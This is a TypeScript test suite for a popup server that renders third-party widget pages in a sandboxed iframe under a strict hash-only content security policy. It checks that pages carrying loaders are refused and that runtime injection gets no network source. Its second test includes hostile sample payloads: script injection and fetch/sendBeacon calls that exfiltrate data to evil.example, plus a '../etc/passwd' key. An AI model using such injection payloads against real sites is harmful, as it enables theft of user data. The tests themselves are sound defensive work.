// task-1358 Tier 5 (+ r2) — pack widgets on the popup host: a widget ticket serves the pack's html BYTE-VERBATIM (nothing
// substituted into it) under a HASH-ONLY CSP — no nonce exists on a widget page; our SDK and every inline block of the page
// are allow-listed by sha256, with Trusted Types + sandbox as belts — and the SDK + meta tags are injected into <head>;
// the html never reaches hello params; per-topic data goes only to widget popups and only for real topics; a page that
// carries a loader (the __NONCE__ token, <script src>, <link>, a frame, <meta http-equiv>, @import) never gets a ticket;
// a page that passes the audit but tries runtime injection / inline handlers / remote images is served with a header that
// has no source for any of it; bad widget tickets are refused at issue time; a non-widget ticket cannot carry a page.
import assert from 'node:assert/strict';
import net from 'node:net';
import { randomBytes } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { test } from 'node:test';
import { createPopupServer, type PopupServer } from '../src/server.ts';
import { createPopupManager } from '../src/open.ts';
import { cspHash, inlineHashes, normalizeWidgetHtml } from '../src/widget-html.ts';
import { WIDGET_TOPICS, WIDGET_HTML_MAX, type ServerEvent, type ThemeTokens, type WidgetPage } from '../src/protocol.ts';

const THEME: ThemeTokens = {
  bg: '#000', panel: '#010', border: '#020', borderFocus: '#39ff14', text: '#fff', muted: '#0a0', dim: '#060',
  accent: '#0ff', up: '#0f0', down: '#f06', warn: '#ff0', ai: '#d77', rain: ['#1', '#2', '#3', '#4'], rainPump: ['#1', '#2', '#3', '#4'], rainDump: ['#1', '#2', '#3', '#4'],
};
const PACK_STYLE = 'body{color:var(--text)}';
const PACK_SCRIPT = "dexterm.on('rows', (vm) => { document.getElementById('x').textContent = vm.rows.length; });";
// plain <script>/<style> (no nonce attribute: there is none to write); the <p> carries the host's OTHER placeholders as
// literal text to prove nothing is substituted into pack html
const PAGE = `<!doctype html><html><head><meta charset="utf-8"><title>T</title><style>${PACK_STYLE}</style></head><body><div id="x">waiting</div><p>__WS_TOKEN__ __PORT__ __POPUP_ID__</p><script>${PACK_SCRIPT}</script></body></html>`;
const SDK = normalizeWidgetHtml(readFileSync(new URL('../src/pages/widget-sdk.js', import.meta.url), 'utf8'));
const widget = (over: Partial<WidgetPage> = {}): WidgetPage => ({ key: 'pack/w/main', title: 'T', topics: ['rows', 'theme'], html: PAGE, ...over });

async function withServer(fn: (srv: PopupServer, events: ServerEvent[]) => Promise<void>): Promise<void> {
  const events: ServerEvent[] = [];
  const srv = await createPopupServer({ theme: THEME, onEvent: (e) => events.push(e) });
  try { await fn(srv, events); } finally { await srv.close(); }
}
const wsMeta = (html: string): string => /<meta name="dexterm-ws" content="([^"]*)">/.exec(html)?.[1] ?? '';
const directive = (csp: string, name: string): string => csp.split(';').map((s) => s.trim()).find((s) => s.startsWith(`${name} `)) ?? '';
const sources = (csp: string, name: string): string[] => directive(csp, name).split(/\s+/).slice(1);
const htmlAttr = (s: string): string => s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c] as string));

/** Minimal raw WebSocket client with an Origin header (copied from server.test.ts). */
function wsConnect(port: number, token: string, origin: string): Promise<{ status: number; messages: unknown[]; send: (o: unknown) => void; close: () => void; waitFor: (pred: (m: unknown) => boolean, ms?: number) => Promise<unknown> }> {
  return new Promise((resolve, reject) => {
    const sock = net.connect(port, '127.0.0.1');
    const key = randomBytes(16).toString('base64');
    let header = '', gotHeader = false, buf = Buffer.alloc(0), status = 0;
    const messages: unknown[] = [];
    const waiters: Array<{ pred: (m: unknown) => boolean; resolve: (m: unknown) => void; t: NodeJS.Timeout }> = [];
    const pushMsg = (m: unknown): void => { messages.push(m); for (let i = waiters.length - 1; i >= 0; i--) if (waiters[i].pred(m)) { clearTimeout(waiters[i].t); waiters[i].resolve(m); waiters.splice(i, 1); } };
    sock.on('error', reject);
    sock.on('data', (d: Buffer) => {
      if (!gotHeader) {
        header += d.toString('latin1');
        const i = header.indexOf('\r\n\r\n');
        if (i < 0) return;
        status = Number(/HTTP\/1\.1 (\d+)/.exec(header)?.[1] ?? 0);
        gotHeader = true;
        const rest = Buffer.from(header.slice(i + 4), 'latin1');
        header = '';
        resolve({ status, messages, send, close, waitFor });
        if (rest.length) parseFrames(rest);
        return;
      }
      parseFrames(d);
    });
    function parseFrames(d: Buffer): void {
      buf = Buffer.concat([buf, d]);
      for (;;) {
        if (buf.length < 2) return;
        const b1 = buf[1]; let len = b1 & 0x7f, off = 2;
        if (len === 126) { if (buf.length < 4) return; len = buf.readUInt16BE(2); off = 4; }
        else if (len === 127) { if (buf.length < 10) return; len = Number(buf.readBigUInt64BE(2)); off = 10; }
        if (buf.length < off + len) return;
        const payload = buf.subarray(off, off + len); buf = buf.subarray(off + len);
        if ((buf[0] ?? 0) === 0 && (payload.length || true)) { try { pushMsg(JSON.parse(payload.toString('utf8'))); } catch { /* close frame etc. */ } }
      }
    }
    function send(o: unknown): void {
      const payload = Buffer.from(JSON.stringify(o)); const mask = randomBytes(4);
      const head = payload.length < 126 ? Buffer.from([0x81, 0x80 | payload.length]) : Buffer.from([0x81, 0x80 | 126, payload.length >> 8, payload.length & 255]);
      const masked = Buffer.from(payload.map((b, i) => b ^ mask[i & 3]));
      sock.write(Buffer.concat([head, mask, masked]));
    }
    function close(): void { sock.destroy(); }
    function waitFor(pred: (m: unknown) => boolean, ms = 2000): Promise<unknown> {
      const hit = messages.find(pred); if (hit) return Promise.resolve(hit);
      return new Promise((res, rej) => { const t = setTimeout(() => rej(new Error('timeout waiting for message')), ms); waiters.push({ pred, resolve: res, t }); });
    }
    sock.write(`GET /ws?t=${encodeURIComponent(token)} HTTP/1.1\r\nHost: 127.0.0.1:${port}\r\nOrigin: ${origin}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`);
  });
}

/** The iframe src the wrapper page carries (the frame route with its one-shot token). */
const frameUrl = (wrapperHtml: string): string => /<iframe id="widget" class="widget" sandbox="allow-scripts" referrerpolicy="no-referrer" title="pack widget" src="([^"]+)">/.exec(wrapperHtml)?.[1] ?? '';
const IFRAME_HEADERS = { 'sec-fetch-dest': 'iframe', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate' };
const fetchFrame = (url: string, headers: Record<string, string> = IFRAME_HEADERS): Promise<Response> => fetch(url, { headers });

test('r3: a widget is TWO documents — the wrapper (ours, nonce CSP, frame-src = exactly the frame route) and the sandboxed frame (the pack page VERBATIM, hash-only, NO network, opaque origin, no credential in it); both tokens single-use; hello never carries the html; the widget socket takes the generic events only', async () => {
  await withServer(async (srv, events) => {
    const url = srv.issueTicket('widget', 'w1', { widget: widget({ title: 'T <b>&' }) });
    assert.match(url, /^http:\/\/127\.0\.0\.1:\d+\/popup\/widget\?p=/);
    // ------------------------------------------------------------ the WRAPPER: our page, like every built-in popup
    const res = await fetch(url);
    assert.equal(res.status, 200);
    const csp = res.headers.get('content-security-policy') ?? '';
    const html = await res.text();
    const nonce = /script-src 'nonce-([A-Za-z0-9_-]+)'/.exec(csp)?.[1] ?? '';
    assert.ok(nonce.length > 10, `the wrapper is nonce-rendered like the built-in pages: ${csp}`);
    assert.equal(directive(csp, 'frame-src'), `frame-src http://127.0.0.1:${srv.port}/popup/widget-frame`, 'the ONE document the iframe may ever show: an exact path on our origin — a self-navigation of the frame to anything else is refused by the engine');
    assert.equal(directive(csp, 'connect-src'), `connect-src ws://127.0.0.1:${srv.port}`, 'the wrapper owns the socket');
    assert.match(csp, /; frame-ancestors 'none';/);
    assert.ok(!/'self'|'unsafe-inline'|'unsafe-eval'|'strict-dynamic'|https?:\/\/(?!127\.0\.0\.1:\d+\/popup\/widget-frame)|\*/.test(csp), csp);
    assert.ok(!html.includes(PACK_SCRIPT) && !html.includes(PACK_STYLE) && !html.includes('<div id="x">'), 'the pack html never enters the wrapper document');
    assert.ok(!html.includes(SDK), 'the SDK is for the frame, not the wrapper');
    assert.ok(html.includes('<span id="title" class="title">T &lt;b&gt;&amp;</span>'), 'the title is ours, escaped');
    const f = frameUrl(html);
    assert.match(f, new RegExp(`^http://127\\.0\\.0\\.1:${srv.port}/popup/widget-frame\\?f=[A-Za-z0-9_-]{40,}$`), `sandbox="allow-scripts" iframe pointing at the frame route with a one-shot token: ${html.slice(0, 400)}`);
    assert.ok(!/allow-same-origin|allow-top-navigation|allow-popups|allow-forms|allow-downloads|allow-modals/.test(html), 'the frame is sandboxed with scripts only: opaque origin, no popups/forms/downloads/top navigation');
    assert.ok(html.includes(`<meta name="dexterm-frame" content="${htmlAttr(f)}">`));
    const token = wsMeta(html);
    assert.ok(token.length > 20 && html.split(token).length === 2, 'the WebSocket token appears exactly once, in the wrapper');
    // the wrapper ticket is single-use
    assert.equal((await fetch(url)).status, 404);
    assert.ok(events.some((e) => e.ev === 'probe.rejected' && e.reason === 'bad-ticket'));
    // ------------------------------------------------------------ the FRAME: the pack page, verbatim, hash-only, no network
    const fr = await fetchFrame(f);
    assert.equal(fr.status, 200);
    const fcsp = fr.headers.get('content-security-policy') ?? '';
    const fhtml = await fr.text();
    assert.match(fcsp, /^default-src 'none'; /);
    assert.ok(!/nonce-/.test(fcsp), `no nonce on a pack page: ${fcsp}`);
    assert.ok(!/'self'|'unsafe-inline'|'unsafe-eval'|'unsafe-hashes'|'strict-dynamic'|data:|blob:|\*|ws:/.test(fcsp), fcsp);
    const scripts = sources(fcsp, 'script-src'), styles = sources(fcsp, 'style-src');
    assert.ok(scripts.length === 2 && scripts.every((s) => /^'sha256-[A-Za-z0-9+/=]+'$/.test(s)), `script-src is exactly two hashes: ${fcsp}`);
    assert.deepEqual(scripts, [cspHash(SDK), cspHash(PACK_SCRIPT)], 'the SDK first, then the pack\'s one inline script — by exact text');
    assert.deepEqual(styles, [cspHash(PACK_STYLE)]);
    assert.deepEqual(inlineHashes(fhtml), { scripts, styles }, 'the header lists precisely the inline blocks of the html that was sent');
    assert.equal(directive(fcsp, 'connect-src'), "connect-src 'none'", 'the pack page has NO network: no socket, no fetch, no beacon, no EventSource');
    assert.equal(directive(fcsp, 'img-src'), "img-src 'none'");
    assert.match(fcsp, /; font-src 'none'; media-src 'none'; base-uri 'none'; form-action 'none'; /);
    assert.equal(directive(fcsp, 'frame-ancestors'), `frame-ancestors http://127.0.0.1:${srv.port}`, 'only our wrapper may embed it');
    assert.match(fcsp, /; object-src 'none'; require-trusted-types-for 'script'; trusted-types 'none'; sandbox allow-scripts$/, 'sandboxed WITHOUT allow-same-origin (opaque origin) and without top-navigation/popups/forms');
    assert.equal(fr.headers.get('x-content-type-options'), 'nosniff');
    assert.equal(fr.headers.get('referrer-policy'), 'no-referrer');
    // the body: the pack markup byte-for-byte, nothing substituted, no nonce attribute, and NO credential of any kind
    assert.ok(fhtml.includes(`<style>${PACK_STYLE}</style>`) && fhtml.includes(`<script>${PACK_SCRIPT}</script>`), 'the pack\'s own tags are served as written');
    assert.ok(fhtml.includes('<p>__WS_TOKEN__ __PORT__ __POPUP_ID__</p>'), 'the host\'s placeholders in pack text stay literal: nothing is substituted into pack html');
    assert.ok(!/\snonce=/.test(fhtml), 'no nonce attribute anywhere in the served document');
    assert.ok(!fhtml.includes(token) && !fhtml.includes('dexterm-ws') && !fhtml.includes('dexterm-popup') && !fhtml.includes('dexterm-port'), 'no socket token, popup id or port in the frame document: nothing in there is worth stealing');
    assert.ok(fhtml.includes('<meta name="dexterm-widget" content="pack/w/main">') && fhtml.includes('<meta name="dexterm-topics" content="rows,theme">') && fhtml.includes(`<meta name="dexterm-host" content="http://127.0.0.1:${srv.port}">`));
    assert.ok(fhtml.includes(`<script>${SDK}</script>`), 'the SDK is inlined as a plain script (hash-listed)');
    assert.ok(fhtml.indexOf("Object.defineProperty(window, 'dexterm'") < fhtml.indexOf("dexterm.on('rows'"), 'the SDK precedes the pack script');
    assert.ok(fhtml.includes('<div id="x">waiting</div>'), 'the pack markup is served as written');
    assert.ok(!/new WebSocket|fetch\(/.test(SDK), 'the SDK itself opens no connection: it talks to the wrapper by postMessage');
    // r4: the DOM seal runs FIRST (before window.dexterm exists): the insertion methods, the HTML-string sinks and WebRTC
    // are locked on the prototypes before any pack script can run (the real-engine proof is handoffs/task-1358-r4-evidence)
    const sealAt = SDK.indexOf("Object.defineProperty(window, 'dextermSealed'"), apiAt = SDK.indexOf("Object.defineProperty(window, 'dexterm',");
    assert.ok(sealAt > 0 && apiAt > sealAt, 'the seal is installed before the API');
    for (const m of ["guard(N, 'appendChild', 0)", "guard(N, 'insertBefore', 0)", "guard(N, 'replaceChild', 0)", "guard(E, 'insertAdjacentElement', 1)", "sinkSetter(E, 'innerHTML')", "sinkMethod(E, 'insertAdjacentHTML')", "sinkMethod(D, 'write')", "sinkMethod(DOMParser.prototype, 'parseFromString')", "'RTCPeerConnection'",
      // r5: the static parsers, execCommand, adoptNode/importNode, the element-taking setters, the kill switch, the Trusted Types flag
      "['parseHTMLUnsafe', 'parseHTML']", "sinkMethod(D, 'execCommand')", "guard(D, 'adoptNode', 0); guard(D, 'importNode', 0)", "['caption', 'tHead', 'tFoot']", "guardSetter(D, 'body')", "guard(HTMLSelectElement.prototype, 'add', 0)", "guard(HTMLOptionsCollection.prototype, 'add', 0)", "new MutationObserver(", "mo.observe(document, { childList: true, subtree: true })", "type: 'breach'", "tt: typeof trustedTypes !== 'undefined'",
      // r6: the activation guard (click / auxclick / submit, capture phase, first), open-only shadow roots, meta[http-equiv] belt
      "for (const type of ['click', 'auxclick', 'submit']) window.addEventListener(type, activation, { capture: true })", "apply(hasAttribute, n, ['download'])", "lock(E, 'attachShadow'", "'meta[http-equiv]'"]) assert.ok(SDK.includes(m), `seal covers ${m}`);
    assert.ok(fhtml.indexOf("'dextermSealed'") > 0 && fhtml.indexOf("'dextermSealed'") < fhtml.indexOf(PACK_SCRIPT), 'the seal precedes the pack script in the served frame document');
    // the frame token is single-use
    assert.equal((await fetchFrame(f)).status, 404);
    assert.ok(events.some((e) => e.ev === 'probe.rejected' && e.reason === 'bad-frame'));
    // a frame URL is only honoured for an iframe fetch from our origin: a top-level open (Sec-Fetch-Dest: document) or a
    // cross-site fetch is refused and the token is NOT spent by the refusal… and a plain fetch without the headers (an
    // engine that does not send them) is still single-use
    const w2 = await (await fetch(srv.issueTicket('widget', 'w2', { widget: widget() }))).text();
    const f2 = frameUrl(w2);
    assert.equal((await fetchFrame(f2, { 'sec-fetch-dest': 'document', 'sec-fetch-site': 'none' })).status, 404, 'top-level navigation to the frame route is refused');
    assert.equal((await fetchFrame(f2, { 'sec-fetch-dest': 'iframe', 'sec-fetch-site': 'cross-site' })).status, 404, 'a foreign page framing it is refused');
    assert.equal((await fetchFrame(f2, {})).status, 200, 'an engine without Sec-Fetch headers still gets its page (once)');
    assert.equal((await fetchFrame(f2, {})).status, 404);
    // ------------------------------------------------------------ the socket (the wrapper's): hello carries key/title/topics, never the html
    const c = await wsConnect(srv.port, token, srv.origin);
    assert.equal(c.status, 101);
    const hello = await c.waitFor((m) => (m as { type?: string }).type === 'hello') as { popup: { kind: string; params: Record<string, unknown> } };
    assert.equal(hello.popup.kind, 'widget');
    assert.deepEqual(hello.popup.params.widget, { key: 'pack/w/main', title: 'T <b>&', topics: ['rows', 'theme'] });
    assert.ok(!JSON.stringify(hello).includes('<!doctype'), 'no html over the socket');
    c.send({ type: 'ready', page: 'widget:pack/w/main', t: 1 });
    await new Promise((r) => setTimeout(r, 50));
    assert.ok(events.some((e) => e.ev === 'popup.ready' && e.popupId === 'w1' && e.kind === 'widget'));
    // per-topic data: declared topics are delivered; a non-topic is refused at the server; a topic to a chart popup is not sent
    srv.sendData('w1', 'rows', { feed: 'trending', rows: [], updatedAt: 1 });
    const data = await c.waitFor((m) => (m as { type?: string }).type === 'data') as { topic: string; payload: { feed: string } };
    assert.equal(data.topic, 'rows'); assert.equal(data.payload.feed, 'trending');
    srv.sendData('w1', 'signer' as never, { x: 1 } as never);
    await new Promise((r) => setTimeout(r, 30));
    assert.equal(c.messages.filter((m) => (m as { type?: string }).type === 'data').length, 1, 'an unknown topic is never sent');
    // r3: a WIDGET socket may send the generic events only — a roster kick, a plan cancel or a chart request that another
    // popup kind is allowed is dropped HERE (not merely ignored by the TUI), never reported as popup.event
    for (const [name, payload] of [['ticket.open', { mint: 'x' }], ['roster.kick', { agent: 'scout' }], ['plan.cancel', { id: 'plan_1_1' }], ['chart.interval', { interval: '1m' }], ['roster.pause', { agent: 'scout' }]] as const) {
      c.send({ type: 'event', name, payload });
    }
    c.send({ type: 'event', name: 'popup.close-request', payload: {} });
    await new Promise((r) => setTimeout(r, 60));
    const dropped = events.filter((e) => e.ev === 'popup.dropped' && e.popupId === 'w1' && e.reason === 'not-allowed');
    assert.equal(dropped.length, 5, `five foreign events dropped by the server: ${JSON.stringify(dropped)}`);
    const delivered = events.filter((e) => e.ev === 'popup.event' && e.popupId === 'w1').map((e) => (e as { name: string }).name);
    assert.deepEqual(delivered, ['popup.close-request'], 'only the generic close request reached the TUI');
    c.close();
  });
});

test('r2/r3 REGRESSION: a page carrying a loader never gets a ticket — the __NONCE__ token, a remote src wearing it, @import, <link>, frames, <meta http-equiv>; a page that passes but injects / navigates at runtime is served in the frame under a header with no source for any of it', async () => {
  await withServer(async (srv, events) => {
    const refused = (html: string, re: RegExp, id: string): void => {
      assert.throws(() => srv.issueTicket('widget', id, { widget: widget({ html }) }), (e: Error) => /page refused: /.test(e.message) && re.test(e.message), `${html} should be refused with ${re}`);
      assert.ok(!srv.popups.has(id), 'no popup registered for a refused ticket');
    };
    // THE r2 DEFECT: the placeholder on a remote script — before r2 the server swapped the live nonce in and the CSP let it load
    const exploit = `<html><head><script nonce="__NONCE__" src="https://evil.example/x.js"></script></head><body><script nonce="__NONCE__">document.title = 'pwned'</script></body></html>`;
    refused(exploit, /__NONCE__/, 'e1');
    refused(exploit, /<script src=…>/, 'e2');
    refused('<p>__NONCE__</p>', /__NONCE__/, 'e3');
    refused(`<style nonce="__NONCE__">${PACK_STYLE}</style>`, /__NONCE__/, 'e4');
    // every other way to load code or a document from elsewhere
    refused('<script src="https://evil.example/x.js"></script>', /<script src=…>/, 'e5');
    refused('<svg><script href="https://evil.example/x.js"></script></svg>', /<script href=…>/, 'e6');
    refused('<link rel="stylesheet" href="https://evil.example/x.css">', /<link>/, 'e7');
    refused('<style>@import url(https://evil.example/x.css);</style>', /@import/, 'e8');
    refused('<iframe src="https://evil.example/"></iframe>', /<iframe>/, 'e9');
    refused('<meta http-equiv="refresh" content="0;url=https://evil.example/">', /<meta http-equiv>/, 'e10');
    refused('<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * \'unsafe-inline\'">', /<meta http-equiv>/, 'e11');
    refused('<base href="https://evil.example/">', /<base>/, 'e12');
    assert.ok(!events.some((e) => e.ev === 'probe.rejected'), 'refusals happen at issue time: nothing was ever served or probed');
    // a page the audit passes but which tries everything at runtime — INCLUDING the r3 defect, navigating ITSELF to a
    // remote URL: served VERBATIM in the frame, and the headers are the whole defence — the injected <script src> has no
    // hash and no source (no 'strict-dynamic'), the inline handler has no hash, the image has no img-src, fetch has no
    // connect-src at all, Trusted Types refuse the sink where implemented, the sandbox refuses window.open / the form /
    // top.location, and the WRAPPER's frame-src refuses the self-navigation (then closes the widget)
    const INJECT = "const s = document.createElement('script'); s.src = 'https://evil.example/exfil?' + encodeURIComponent(JSON.stringify(dexterm.theme)); document.head.appendChild(s); document.body.innerHTML = '<img src=https://evil.example/p.png>'; location.href = 'https://evil.example/?' + document.title; top.location = 'https://evil.example/top'; window.open('https://evil.example/'); fetch('https://evil.example/f'); navigator.sendBeacon('https://evil.example/b', 'x');";
    const subtle = `<html><head><title>S</title></head><body onload="fetch('https://evil.example')"><img src="https://evil.example/p.png"><form action="https://evil.example/post" method="post"><input name="x"></form><script>${INJECT}</script></body></html>`;
    const wrapper = await fetch(srv.issueTicket('widget', 's1', { widget: widget({ html: subtle }) }));
    assert.equal(wrapper.status, 200);
    const whtml = await wrapper.text();
    assert.ok(!whtml.includes(INJECT), 'the hostile page is not in the wrapper');
    const res = await fetchFrame(frameUrl(whtml));
    assert.equal(res.status, 200);
    const csp = res.headers.get('content-security-policy') ?? '';
    const html = await res.text();
    assert.deepEqual(sources(csp, 'script-src'), [cspHash(SDK), cspHash(INJECT)], 'script-src is the SDK hash + the one inline block: a runtime-inserted <script src> matches nothing');
    assert.equal(directive(csp, 'style-src'), "style-src 'none'", 'no inline style on this page → no style source at all');
    assert.ok(!/strict-dynamic/.test(csp), "'strict-dynamic' would hand trust to inserted scripts: never set");
    assert.equal(directive(csp, 'img-src'), "img-src 'none'");
    assert.equal(directive(csp, 'form-action'), "form-action 'none'");
    assert.equal(directive(csp, 'connect-src'), "connect-src 'none'", 'fetch / beacon / EventSource / WebSocket: no source at all');
    assert.equal(directive(csp, 'require-trusted-types-for'), "require-trusted-types-for 'script'");
    assert.equal(directive(csp, 'trusted-types'), "trusted-types 'none'");
    assert.equal(directive(csp, 'sandbox'), 'sandbox allow-scripts', 'no allow-same-origin, allow-top-navigation, allow-popups, allow-forms, allow-downloads');
    assert.ok(html.includes(`<body onload="fetch('https://evil.example')">`) && html.includes(`<script>${INJECT}</script>`), 'served verbatim (the headers, not a rewrite, are the defence)');
    assert.ok(html.indexOf("Object.defineProperty(window, 'dexterm'") < html.indexOf(INJECT), 'the SDK still precedes it');
    // CR LF in the pack file: the browser hashes LF text, so the server serves LF text and hashes exactly that
    const crlf = PAGE.replace(/<\/style>/, '</style>\r\n').replace(/<script>/, '<script>\r\n');
    const r2 = await fetchFrame(frameUrl(await (await fetch(srv.issueTicket('widget', 's2', { widget: widget({ html: crlf }) }))).text()));
    const h2 = await r2.text();
    assert.ok(!h2.includes('\r'), 'no CR survives');
    assert.deepEqual(sources(r2.headers.get('content-security-policy') ?? '', 'script-src'), [cspHash(SDK), cspHash(`\n${PACK_SCRIPT}`)]);
    // a page without <head>: the SDK is still injected ahead of the body
    const bare = await (await fetchFrame(frameUrl(await (await fetch(srv.issueTicket('widget', 'w3', { widget: widget({ html: '<p>hi</p>' }) }))).text()))).text();
    assert.ok(bare.startsWith('<!doctype html><html><head><meta charset="utf-8"><meta name="dexterm-widget"'), bare.slice(0, 120));
    assert.ok(bare.endsWith('<body><p>hi</p></body></html>'));
    // refusals at issue time: bad key, oversized page, missing html, unknown topics dropped, a widget page on a chart ticket
    assert.throws(() => srv.issueTicket('widget', 'w4', { widget: widget({ key: '../etc/passwd' }) }), /widget ticket needs/);
    assert.throws(() => srv.issueTicket('widget', 'w5', { widget: widget({ html: 'x'.repeat(WIDGET_HTML_MAX + 1) }) }), /max 512000/);
    assert.throws(() => srv.issueTicket('widget', 'w6', { widget: { key: 'a/b', title: 't', topics: ['rows'] } as never }), /widget ticket needs/);
    assert.throws(() => srv.issueTicket('widget', 'w7', {}), /widget ticket needs/);
    assert.throws(() => srv.issueTicket('chart', 'w8', { widget: widget() }), /cannot carry a widget page/);
    const u = srv.issueTicket('widget', 'w9', { widget: widget({ topics: ['rows', 'signer', 'theme'] as never }) });
    assert.ok((await (await fetchFrame(frameUrl(await (await fetch(u)).text()))).text()).includes('<meta name="dexterm-topics" content="rows,theme">'), 'unknown topics are dropped, not served');
    // the ticketed kind must match the route, both ways; the frame route takes no ticket
    const t = srv.issueTicket('widget', 'w10', { widget: widget() });
    assert.equal((await fetch(t.replace('/popup/widget', '/popup/chart'))).status, 404);
    assert.equal((await fetch(srv.issueTicket('chart', 'c0', {}).replace('/popup/chart', '/popup/widget'))).status, 404, 'a chart ticket does not buy the widget wrapper');
    assert.equal((await fetchFrame(t.replace('/popup/widget?p=', '/popup/widget-frame?f='))).status, 404, 'a wrapper ticket is not a frame token');
    assert.equal((await fetchFrame(`${srv.origin}/popup/widget-frame`)).status, 404);
    assert.deepEqual([...WIDGET_TOPICS], ['rows', 'token', 'narrative', 'positions', 'alerts', 'theme']);
    // the built-in pages still use their nonce and get no frame-src (unchanged by r2/r3)
    const chart = await fetch(srv.issueTicket('chart', 'c1', {}));
    const ccsp = chart.headers.get('content-security-policy') ?? '';
    assert.match(ccsp, /^default-src 'none'; script-src 'nonce-[A-Za-z0-9_-]+'; style-src 'nonce-[A-Za-z0-9_-]+'/);
    assert.ok(!/trusted-types|sandbox|frame-src/.test(ccsp), 'the belts and the frame are for pack pages');
  });
});

test('r4: createPopupManager REFUSES a widget under the browser fallback (an engine the host does not route through its sink proxy); built-in popups still open there; no sink proxy is started for the browser', async () => {
  const mgr = createPopupManager({ forceBrowser: true, platform: 'linux', theme: THEME });
  try {
    await assert.rejects(() => mgr.open({ kind: 'widget', title: 'T', widget: widget() }), /pack widgets open only in the native popup shell behind its sink proxy — browser fallback \(browser requested\)/);
    await assert.rejects(() => mgr.open({ kind: 'chart', route: 'widget', title: 'T', widget: widget() }), /pack widgets open only/);
    assert.equal(mgr.widgetsAllowed, false);
    assert.match(mgr.widgetReason ?? '', /browser fallback/);
    assert.equal(mgr.sinkProxyPort, null, 'the sink proxy exists for the native shell only');
    const h = await mgr.open({ kind: 'chart', title: 'T' });
    assert.equal(h.kind, 'chart');
    h.close();
  } finally { await mgr.shutdown(); }
});
